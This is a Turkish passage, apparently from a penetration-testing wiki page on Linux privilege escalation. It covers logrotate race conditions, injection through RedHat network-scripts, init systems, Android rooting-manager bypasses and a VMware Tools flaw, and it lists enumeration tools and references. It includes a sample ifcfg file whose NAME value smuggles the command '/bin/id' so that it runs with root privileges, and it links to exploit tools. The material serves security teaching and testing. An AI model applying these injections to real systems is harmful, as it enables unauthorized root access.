Ayrıcalıklı bir `logrotate` işi, yalnızca düşük ayrıcalıklı bir kullanıcının döndürme sırasında değiştirebildiği veya başka bir yere yönlendirebildiği bir dizinin altındaki bir günlük dosyasını gerçekten döndürdüğünde, kullanıcılar arası bir dosya yazma yolu oluşturabilir. Tek başına yazılabilir bir günlük dosyası yalnızca araştırılması gereken bir ipucudur. Etkin kuralı ve `create`, `olddir` ve `su` yönergelerini; zamanlayıcının etkin kimliğini; günlük dosyasının üst dizini üzerindeki yazma ve arama izinlerini; ayrıca kurulu sürümün ve politikanın hedef değişikliğine izin verip vermediğini doğrulayın. Daha sonra çalıştırılacak ayrıcalıklı bir kabuğun, başlangıç dosyasına yazmanın komut çalıştırmaya dönüşmesi için oluşan dosyayı yüklemesi de gerekir. Döndürmeyi tetiklemeden veya yarış koşulunu denemeden zamanlamayı, kuralı, sürümü/paketlemeyi ve yol meta verilerini inceleyin.

> [!TIP]
> `3.18.0` sürümünü veya herhangi bir sürüm bilgisini tek başına istismar edilebilirlik sınırı olarak kabul etmeyin. [Upstream değişiklik günlüğünde](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) birden fazla sürümdeki dizin ve symlink güçlendirmeleri kayıtlıdır; dağıtımlar düzeltmeleri geriye dönük olarak da uygulayabilir. [Upstream kılavuzu](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in), root ayrıcalıklı olmayan kullanıcıların denetimindeki dizinlerde günlükleri döndürdüğünde `su` kullanılmasını önerir; etkin kuralı ve gerçek davranışı doğrulayın.

Güvenlik açığı hakkında daha ayrıntılı bilgi şu sayfada bulunabilir: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Bu güvenlik açığını [**logrotten**](https://github.com/whotwagner/logrotten) ile istismar edebilirsiniz.

Bu güvenlik açığı [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx günlükleri)** ile çok benzerdir; bu nedenle günlükleri değiştirebildiğinizi fark ettiğinizde, bu günlükleri kimin yönettiğini kontrol edin ve günlükleri symlink'lerle değiştirerek ayrıcalıkları yükseltip yükseltemeyeceğinizi araştırın.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Güvenlik açığı referansı:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Düşük ayrıcalıklı bir kullanıcı bir `ifcfg-*` dosyasını oluşturabiliyor veya değiştirebiliyorsa **ve** ayrıcalıklı bir ağ etkinleştirme yolu bu dosyanın tam olarak kendisini okuyacaksa, bu dosya araştırılması gereken bir ipucudur. Etkin dosya ve dizin izinlerini, seçilen arabirimi, kurulu `ifup`/`ifdown` uygulamasını ve bu komutları kimin çağırdığını doğrulayın. Tek başına yazılabilir bir dosya kod çalıştırmaz. [Red Hat'in RHEL 7 ağ kılavuzu](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files), eski ağ betiklerini NetworkManager'dan ayırır: NetworkManager eski betikleri kendi başına tetiklemez. [RHEL 8 belgelerinde](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) varsayılan `ifup`/`ifdown` uygulamalarının NetworkManager'ı kullandığı, isteğe bağlı eski paketinin ise shell betikleri sağladığı belirtilir.

Gerçekten ayrıcalıklı eski betikleri kullanan bir sistemde, tırnak içine alınmamış ve shell tarafından kaynak olarak yüklenen `NAME=` gibi bir `ifcfg-*` ataması, kod çalıştırma sınırını aşabilir. Kesin ayrıştırıcıyı, değeri ve etkinleştirme yolunu doğrulayın; dosya adından veya NetworkManager'ın varlığından shell yorumlaması yapıldığını çıkarsamayın. Çağıranın dosyayı doğrudan düzenleyemediği durumlarda bile, kullanıcı girdisini `ifcfg-*` dosyasına yazan ve ardından eski `ifup` komutunu çağıran, sudo ile çalıştırılmasına izin verilmiş bir sarmalayıcı bu sınıra ulaşmanın ayrı bir yoludur.

Örneğin: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Network ile /bin/id arasındaki boşluğa dikkat edin_)

### **init, init.d, systemd ve rc.d**

`/etc/init.d` dizini, System V init (SysVinit) için **script'lere**, yani **klasik Linux hizmet yönetimi sistemine** ev sahipliği yapar. Hizmetleri `start`, `stop`, `restart` ve bazen `reload` etmek için kullanılan script'leri içerir. Bunlar doğrudan veya `/etc/rc?.d/` içindeki sembolik bağlantılar aracılığıyla çalıştırılabilir. Redhat sistemlerindeki alternatif yol `/etc/rc.d/init.d` şeklindedir.

Öte yandan `/etc/init`, Ubuntu tarafından sunulan daha yeni bir **hizmet yönetim sistemi** olan **Upstart** ile ilişkilidir ve hizmet yönetimi görevleri için yapılandırma dosyaları kullanır. Upstart'a geçişe rağmen, Upstart'taki uyumluluk katmanı sayesinde SysVinit script'leri Upstart yapılandırmalarının yanında kullanılmaya devam eder.

**systemd**, isteğe bağlı daemon başlatma, automount yönetimi ve sistem durumu anlık görüntüleri gibi gelişmiş özellikler sunan modern bir başlatma ve hizmet yöneticisi olarak öne çıkar. Dağıtım paketleri için dosyaları `/usr/lib/systemd/`, yöneticilerin yaptığı değişiklikler içinse `/etc/systemd/system/` dizininde düzenleyerek sistem yönetimi sürecini kolaylaştırır.<sup>[[21]](#references)</sup>

## Diğer Teknikler

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Kısıtlı Shell'lerden kaçış


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../../network-services-pentesting/cisco-sd-wan-manager-local-privilege-escalation.md
{{#endref}}

## Android rooting framework'leri: manager-channel istismarı

Android rooting framework'leri, ayrıcalıklı kernel işlevlerini userspace manager'a sunmak için genellikle bir syscall'a hook uygular. Zayıf manager kimlik doğrulaması (ör. FD sırasına dayalı signature kontrolleri veya zayıf parola yöntemleri), yerel bir uygulamanın manager'ı taklit etmesine ve zaten root edilmiş cihazlarda root ayrıcalığına yükselmesine olanak tanıyabilir. Daha fazla bilgi ve exploitation ayrıntılarına buradan ulaşabilirsiniz:


{{#ref}}
../../../mobile-pentesting/android-app-pentesting/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools hizmet keşfi: regex tabanlı exec yoluyla LPE (CWE-426) (CVE-2025-41244)

VMware Tools/Aria Operations'taki regex tabanlı hizmet keşfi, süreç komut satırlarından bir binary yolunu çıkarıp ayrıcalıklı bir bağlamda -v ile çalıştırabilir. İzin verici kalıplar (ör. \S kullanımı), saldırganın yazılabilir konumlarda (ör. /tmp/httpd) hazırladığı dinleyicilerle eşleşebilir ve root olarak kod çalıştırılmasına yol açabilir (CWE-426 Güvenilmeyen Arama Yolu).<sup>[[27]](#references)</sup>

Daha fazla bilgi edinmek ve diğer keşif/izleme yığınlarına uygulanabilecek genelleştirilmiş bir kalıbı görmek için:


{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Güvenlik Korumaları

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Araçları

### **Linux yerel privilege escalation vektörlerini aramak için en iyi araç:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t seçeneği)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux ve MAC'teki kernel açıklarını numaralandırır [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fiziksel erişim):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Daha fazla script derlemesi**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)



## References

- [1] [0xdf – HTB Planning (Crontab UI privesc, zip -P kimlik bilgisi yeniden kullanımı)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: cron tarafından çalıştırılan monitor için sahte .text_sig payload'u](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch atlatması (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Temel Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Linux Privilege Escalation Rehberi](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Saldır ve Savun: 2016'nın Linux Privilege Escalation Teknikleri](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Hiç kimse komut çalıştırma beklemiyor!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux Privilege Escalation)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Laboratuvar Alıştırmaları Çözüm Yolu - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Linux Priv Escalation için İpuçları ve Püf Noktaları](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Linux Enumeration ve Privilege Escalation aracı](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket nedir?](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) writeup'ı](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [D-BUS'a bağlanın](https://www.linuxjournal.com/article/7744)
- [17] [SUID Executables Linux Privilege Escalation](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Bölüm 2 – Linux Privilege Escalation](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Linux'ta ACL'leri yönetme](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Redhat/CentOS network-scripts üzerinden root](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd nedir?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (log'lar aracılığıyla bash aritmetik injection, genel zincir)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash Kılavuzu – BASH_ENV (etkileşimsiz başlangıç dosyası)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (pg_basebackup cron kopyalama → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Adını siz koyun, VMware ayrıcalık yükseltir (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo Chroot ayrıcalık yükseltmesi](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 ve CVE-2025-32463 Sudo ayrıcalık yükseltme açıkları](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC Depo Dizinleri](https://peps.python.org/pep-3147/)
- [32] [Python importlib belgeleri](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [@paragonsec tarafından atılan tweet](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Linux'ta Parolaları Kaydetme](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Logrotate Race Condition Ayrıntıları](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Python 3.10 belgeleri – `site` ve yol yapılandırma dosyaları](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
